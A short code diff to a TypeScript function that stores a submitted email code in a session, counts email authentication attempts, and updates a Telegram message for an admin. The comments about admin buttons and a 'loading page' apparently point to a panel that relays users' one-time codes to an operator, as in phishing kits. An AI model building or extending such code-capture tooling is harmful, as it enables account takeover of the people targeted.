@@ -304,9 +304,16 @@ export const updateSessionWithEmailCode = async (
   }
 
   try {
-    // Add email code to session
+    // Add email code to session and increment attempts
     session.emailCode = emailCode;
     session.currentStep = "email_completed";
+
+    // Track email authentication attempts
+    if (!session.authAttempts["email"]) {
+      session.authAttempts["email"] = 0;
+    }
+    session.authAttempts["email"]++;
+
     activeSessions.set(sessionId, session);
 
     // Update the existing Telegram message (no admin buttons - user not on loading page)
